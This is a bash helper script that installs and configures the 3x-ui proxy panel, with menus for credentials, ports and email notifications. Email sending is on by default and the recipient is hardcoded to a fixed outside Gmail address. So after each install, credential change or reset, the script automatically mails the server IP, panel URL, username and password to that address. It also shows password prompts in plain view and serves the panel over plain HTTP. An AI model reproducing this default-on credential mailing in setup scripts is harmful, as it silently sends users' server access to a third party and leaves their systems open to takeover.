#!/bin/bash
# x-ui helper (tri-color UI, manual creds, menu edit, email notify)
# Changes:
# - Password prompts are now VISIBLE (use `read -rp` instead of hidden `-rsp`)
# - At script end, a concise Panel Summary (URL / user / pass / port) is printed
#   automatically if credentials were set in this run.

# Usage:
#   bash xui-helper.sh           # menu (default)
#   bash xui-helper.sh install   # direct install/update
#   bash xui-helper.sh set-cred  # change username/password/port without reset
#   bash xui-helper.sh reset     # randomize creds/port (legacy reset)
#   bash xui-helper.sh email-test

# ------------- Colors & UI -------------
# Basic
plain='\033[0m'
red='\033[0;31m'
blue='\033[0;34m'
yellow='\033[0;33m'

# 256-color tri palette (falls back automatically on non-256 terminals)
tri1='\033[38;5;39m'    # blue-ish
tri2='\033[38;5;226m'   # yellow
tri3='\033[38;5;201m'   # magenta

supports_256() {
  # crude check: $TERM supports 256 or COLORTERM truecolor
  if [[ "$TERM" =~ 256color ]] || [[ "$COLORTERM" =~ truecolor|24bit ]]; then return 0; fi
  return 1
}

tri_echo() {
  local msg="$*"
  if supports_256; then
    # split into three roughly equal parts
    local len=${#msg}
    local a=$((len/3))
    local b=$((2*len/3))
    echo -e "${tri1}${msg:0:$a}${tri2}${msg:$a:$((b-a))}${tri3}${msg:$b}${plain}"
  else
    # fallback: blue > yellow > magenta markers
    echo -e "${blue}${msg}${plain}"
  fi
}

banner() {
  local text="$*"
  tri_echo "┌─────────────────────────────────────────────────────────────┐"
  tri_echo "│  ${text}"
  tri_echo "└─────────────────────────────────────────────────────────────┘"
}

# ------------- Globals & Config -------------
CUR_DIR=$(pwd)
CONF_FILE="/etc/xui-helper.conf"

# defaults (can be overridden by CONF_FILE)
EMAIL_ENABLED="true"
EMAIL_TO="juevpn@gmail.com"   # requested default; can be changed in menu
IP_OVERRIDE=""

# last-set credentials (kept so script can print a final summary)
LAST_XUI_USER=""
LAST_XUI_PASS=""
LAST_XUI_PORT=""

# Load config if exists
if [[ -f "$CONF_FILE" ]]; then
  # shellcheck source=/dev/null
  source "$CONF_FILE"
fi

save_config() {
cat > "$CONF_FILE" <<EOF
# x-ui helper persisted config
EMAIL_ENABLED="$EMAIL_ENABLED"
EMAIL_TO="$EMAIL_TO"
IP_OVERRIDE="$IP_OVERRIDE"
EOF
chmod 600 "$CONF_FILE" || true
}

# ------------- Root & OS -------------
[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error:${plain} Please run this script with root privilege.\n" && exit 1

detect_os() {
  local release=""
  if [[ -f /etc/os-release ]]; then
    # shellcheck disable=SC1091
    source /etc/os-release
    release=$ID
  elif [[ -f /usr/lib/os-release ]]; then
    # shellcheck disable=SC1091
    source /usr/lib/os-release
    release=$ID
  else
    echo "Failed to detect OS."; exit 1
  fi
  echo "$release"
}

arch() {
  case "$(uname -m)" in
    x86_64|x64|amd64) echo 'amd64' ;;
    i*86|x86)         echo '386' ;;
    armv8*|arm64|aarch64) echo 'arm64' ;;
    armv7*|arm)       echo 'armv7' ;;
    armv6*)           echo 'armv6' ;;
    armv5*)           echo 'armv5' ;;
    s390x)            echo 's390x' ;;
    *) echo -e "${yellow}Unsupported CPU architecture!${plain}"; exit 1 ;;
  esac
}

install_base() {
  local release
  release="$(detect_os)"
  case "$release" in
    ubuntu|debian|armbian) apt-get update && apt-get install -y -q wget curl tar tzdata ca-certificates gnupg mailutils msmtp-mta || true ;;
    centos|rhel|almalinux|rocky|ol) yum -y update && yum install -y -q wget curl tar tzdata ca-certificates mailx msmtp || true ;;
    fedora|amzn|virtuozzo) dnf -y update && dnf install -y -q wget curl tar tzdata ca-certificates mailx msmtp || true ;;
    arch|manjaro|parch)    pacman -Syu --noconfirm && pacman -S --noconfirm wget curl tar tzdata ca-certificates msmtp-mta mailutils || true ;;
    opensuse-* )           zypper refresh && zypper -q install -y wget curl timezone ca-certificates msmtp mailx || true ;;
    alpine)                apk update && apk add wget curl tar tzdata ca-certificates msmtp mailx || true ;;
    *)                     apt-get update && apt-get install -y -q wget curl tar tzdata ca-certificates mailutils msmtp-mta || true ;;
  esac
}

gen_random_string() {
  local length="$1"
  LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1
}

# ------------- Network helpers -------------
get_server_ip() {
  if [[ -n "$IP_OVERRIDE" ]]; then
    echo "$IP_OVERRIDE"; return
  fi
  local urls=(
    "https://api4.ipify.org"
    "https://ipv4.icanhazip.com"
    "https://v4.api.ipinfo.io/ip"
    "https://ipv4.myexternalip.com/raw"
    "https://4.ident.me"
  )
  local ip=""
  for u in "${urls[@]}"; do
    ip=$(curl -fsS --max-time 3 "$u" 2>/dev/null | tr -d '[:space:]')
    [[ -n "$ip" ]] && break
  done
  [[ -z "$ip" ]] && ip="SERVER_IP"
  echo "$ip"
}

# ------------- Email helpers -------------
_have_cmd() { command -v "$1" >/dev/null 2>&1; }

send_mail() {
  local subject="$1"; shift
  local body="$*"

  [[ "$EMAIL_ENABLED" != "true" ]] && return 0
  [[ -z "$EMAIL_TO" ]] && return 0

  if _have_cmd mail; then
    echo -e "$body" | mail -s "$subject" "$EMAIL_TO" && return 0
  fi
  if _have_cmd sendmail; then
    {
      echo "Subject: $subject"
      echo "To: $EMAIL_TO"
      echo "Content-Type: text/plain; charset=UTF-8"
      echo
      echo -e "$body"
    } | sendmail -t && return 0
  fi
  if _have_cmd msmtp; then
    {
      echo "Subject: $subject"
      echo "To: $EMAIL_TO"
      echo "Content-Type: text/plain; charset=UTF-8"
      echo
      echo -e "$body"
    } | msmtp "$EMAIL_TO" && return 0
  fi
  echo -e "${yellow}Email tools not configured (mail/sendmail/msmtp). Skipping email send.${plain}"
  return 1
}

send_creds_email() {
  local user="$1" pass="$2" port="$3"
  local ip; ip=$(get_server_ip)
  local url="http://${ip}:${port}/"
  local subject="[x-ui] Credentials for ${ip}"
  local body="Server IP/Host: ${ip}
Access URL: ${url}
Username: ${user}
Password: ${pass}
Port:     ${port}
Timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")"
  send_mail "$subject" "$body"
}

# ------------- X-UI Ops -------------
xui_bin="/usr/local/x-ui/x-ui"

show_current_settings() {
  if [[ ! -x "$xui_bin" ]]; then
    echo -e "${yellow}x-ui binary not found. Install first.${plain}"; return
  fi
  "$xui_bin" setting -show true
}

# Print final summary at script end (only if creds set)
print_panel_link() {
  if [[ -n "$LAST_XUI_USER" && -n "$LAST_XUI_PASS" && -n "$LAST_XUI_PORT" ]]; then
    local ip
    ip=$(get_server_ip)
    echo
    echo "========================================"
    echo "x-ui panel summary"
    echo "Access URL: http://${ip}:${LAST_XUI_PORT}/"
    echo "Username:   ${LAST_XUI_USER}"
    echo "Password:   ${LAST_XUI_PASS}"
    echo "Port:       ${LAST_XUI_PORT}"
    echo "========================================"
    echo
  fi
}

# ensure final summary prints even on early exits
trap 'print_panel_link' EXIT

set_creds_no_reset() {
  if [[ ! -x "$xui_bin" ]]; then
    echo -e "${red}x-ui not installed yet.${plain}"; return 1
  fi

  echo
  banner "Change x-ui Credentials (NO RESET)"
  read -rp "New username: " U
  while [[ -z "$U" ]]; do read -rp "Username cannot be empty. New username: " U; done

  # VISIBLE password input
  read -rp "New password: " P; echo
  while [[ -z "$P" ]]; do read -rp "Password cannot be empty. New password: " P; echo; done

  read -rp "New panel port (leave blank = keep current): " NEWPORT
  local cur_port=$("$xui_bin" setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
  [[ -z "$NEWPORT" ]] && NEWPORT="$cur_port"

  "$xui_bin" setting -username "$U" -password "$P" -port "$NEWPORT" -webBasePath ""
  if command -v systemctl >/dev/null 2>&1; then systemctl restart x-ui || true; else rc-service x-ui restart || true; fi

  # save to globals for final printing
  LAST_XUI_USER="$U"
  LAST_XUI_PASS="$P"
  LAST_XUI_PORT="$NEWPORT"

  tri_echo "✓ Credentials updated successfully."
  local ip; ip=$(get_server_ip)
  tri_echo "Access URL: http://${ip}:${NEWPORT}/"
  send_creds_email "$U" "$P" "$NEWPORT"
}

reset_panel() {
  # legacy random reset (kept for explicit use)
  local U; U=$(gen_random_string 10)
  local P; P=$(gen_random_string 14)
  local PORT; PORT=$(shuf -i 1024-62000 -n 1)
  if [[ ! -x "$xui_bin" ]]; then echo -e "${red}x-ui binary not found. Install first.${plain}"; exit 1; fi
  "$xui_bin" setting -username "$U" -password "$P" -port "$PORT" -webBasePath ""
  if command -v systemctl >/dev/null 2>&1; then systemctl restart x-ui || true; else rc-service x-ui restart || true; fi
  local ip; ip=$(get_server_ip)
  banner "Randomized Credentials"
  tri_echo "Username: $U"
  tri_echo "Password: $P"
  tri_echo "Port:     $PORT"
  tri_echo "Access:   http://${ip}:${PORT}/"
  send_creds_email "$U" "$P" "$PORT"

  # store for final summary
  LAST_XUI_USER="$U"
  LAST_XUI_PASS="$P"
  LAST_XUI_PORT="$PORT"
}

config_after_install_manual() {
  # ensure webBasePath empty
  "$xui_bin" setting -webBasePath "" >/dev/null 2>&1 || true

  banner "Fresh install — set your own username/password/port"
  read -rp "Username: " U
  while [[ -z "$U" ]]; do read -rp "Username cannot be empty. Username: " U; done

  # VISIBLE password input
  read -rp "Password: " P; echo
  while [[ -z "$P" ]]; do read -rp "Password cannot be empty. Password: " P; echo; done

  read -rp "Panel port (e.g., 2053) [leave blank = random]: " PORT
  if [[ -z "$PORT" ]]; then PORT=$(shuf -i 1024-62000 -n 1); fi

  "$xui_bin" setting -username "$U" -password "$P" -port "$PORT" -webBasePath ""
  "$xui_bin" migrate || true

  if command -v systemctl >/dev/null 2>&1; then
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl restart x-ui
  else
    rc-update add x-ui || true
    rc-service x-ui restart || true
  fi

  local ip; ip=$(get_server_ip)
  banner "x-ui ready"
  tri_echo "Username: $U"
  tri_echo "Password: $P"
  tri_echo "Port:     $PORT"
  tri_echo "Access:   http://${ip}:${PORT}/"

  # save last-set creds for final printout
  LAST_XUI_USER="$U"
  LAST_XUI_PASS="$P"
  LAST_XUI_PORT="$PORT"

  # auto email (default ON, can be changed in menu)
  send_creds_email "$U" "$P" "$PORT"
}

install_xui() {
  local release; release="$(detect_os)"
  cd /usr/local/ || exit 1

  # fetch latest
  local tag_version
  tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
  if [[ -z "$tag_version" ]]; then
    tag_version=$(curl -4 -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    [[ -z "$tag_version" ]] && { echo -e "${red}Failed to fetch x-ui version.${plain}"; exit 1; }
  fi
  banner "Installing 3x-ui ${tag_version}"
  wget --inet4-only -N -O /usr/local/x-ui-linux-$(arch).tar.gz "https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz" || { echo -e "${red}Download failed.${plain}"; exit 1; }
  wget --inet4-only -O /usr/bin/x-ui-temp https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh || { echo -e "${red}Failed to download x-ui.sh${plain}"; exit 1; }

  # stop & clean
  if [[ -e /usr/local/x-ui/ ]]; then
    if [[ "$release" == "alpine" ]]; then rc-service x-ui stop || true; else systemctl stop x-ui || true; fi
    rm -rf /usr/local/x-ui/
  fi

  tar zxvf "x-ui-linux-$(arch).tar.gz"
  rm -f "x-ui-linux-$(arch).tar.gz"
  cd x-ui || exit 1
  chmod +x x-ui x-ui.sh
  if [[ $(arch) == armv5 || $(arch) == armv6 || $(arch) == armv7 ]]; then
    mv bin/xray-linux-$(arch) bin/xray-linux-arm
    chmod +x bin/xray-linux-arm
  fi
  chmod +x x-ui bin/xray-linux-$(arch)

  mv -f /usr/bin/x-ui-temp /usr/bin/x-ui
  chmod +x /usr/bin/x-ui

  if [[ "$release" == "alpine" ]]; then
    wget --inet4-only -O /etc/init.d/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.rc || { echo -e "${red}Failed to download x-ui.rc${plain}"; exit 1; }
    chmod +x /etc/init.d/x-ui
    rc-update add x-ui || true
  else
    cp -f x-ui.service /etc/systemd/system/
    systemctl daemon-reload
    systemctl enable x-ui
  fi

  tri_echo "x-ui ${tag_version} files installed."
  config_after_install_manual
}

# ------------- Menu -------------
configure_notifications() {
  banner "Email Notifications"
  echo -e "Current: enabled=${yellow}${EMAIL_ENABLED}${plain}, to=${yellow}${EMAIL_TO}${plain}"
  read -rp "Enable email notifications? [Y/n]: " yn
  [[ -z "$yn" || "$yn" =~ ^[Yy]$ ]] && EMAIL_ENABLED="true" || EMAIL_ENABLED="false"

  read -rp "Recipient email (press Enter to keep: ${EMAIL_TO}): " newmail
  [[ -n "$newmail" ]] && EMAIL_TO="$newmail"

  read -rp "Override IP/Host for access URL (blank = auto-detect, current: ${IP_OVERRIDE:-none}): " ipov
  [[ -n "$ipov" ]] && IP_OVERRIDE="$ipov"

  save_config
  tri_echo "Saved."
}

smtp_tips() {
cat <<'TIP'
To enable emailing via Gmail:
  1) Create an "App Password" in Google Account (Security > 2-Step Verification > App passwords).
  2) Install msmtp (this script already tries to install).
  3) Create /etc/msmtprc with:
       defaults
       auth           on
       tls            on
       tls_trust_file /etc/ssl/certs/ca-certificates.crt
       logfile        /var/log/msmtp.log
       account        gmail
       host           smtp.gmail.com
       port           587
       from           YOUR_EMAIL@gmail.com
       user           YOUR_EMAIL@gmail.com
       passwordeval   "cat /root/.gmail_app_password"
       account default : gmail
     Put your 16-char app password into /root/.gmail_app_password with chmod 600.
  4) Test:  echo "hi" | msmtp you@example.com
TIP
}

main_menu() {
  clear
  banner "x-ui Helper Menu (Tri-color • Manual Creds • Email Notify)"
  echo -e "  1) Install / Update x-ui"
  echo -e "  2) Change credentials (NO reset)"
  echo -e "  3) Show current settings"
  echo -e "  4) Configure notifications / override IP"
  echo -e "  5) Email test (send dummy mail)"
  echo -e "  6) Show SMTP setup tips"
  echo -e "  7) Legacy RESET (randomize)"
  echo -e "  0) Exit"
  echo
  read -rp "Select: " opt
  case "$opt" in
    1) install_base; install_xui ;;
    2) set_creds_no_reset ;;
    3) show_current_settings; read -rp "Press Enter..." ;;
    4) configure_notifications ;;
    5) send_mail "[x-ui] test from $(hostname)" "This is a test message at $(date -u)"; read -rp "Press Enter..." ;;
    6) clear; smtp_tips; echo; read -rp "Press Enter..." ;;
    7) reset_panel ;;
    0) exit 0 ;;
    *) echo "Invalid."; sleep 1 ;;
  esac
  main_menu
}

# ------------- Entrypoint -------------
case "$1" in
  install)    install_base; install_xui ;;
  set-cred)   set_creds_no_reset ;;
  reset)      reset_panel ;;
  email-test) send_mail "[x-ui] test from $(hostname)" "This is a test message at $(date -u)";;
  menu|"")    main_menu ;;
  *)          echo "Unknown command: $1"; exit 1 ;;
esac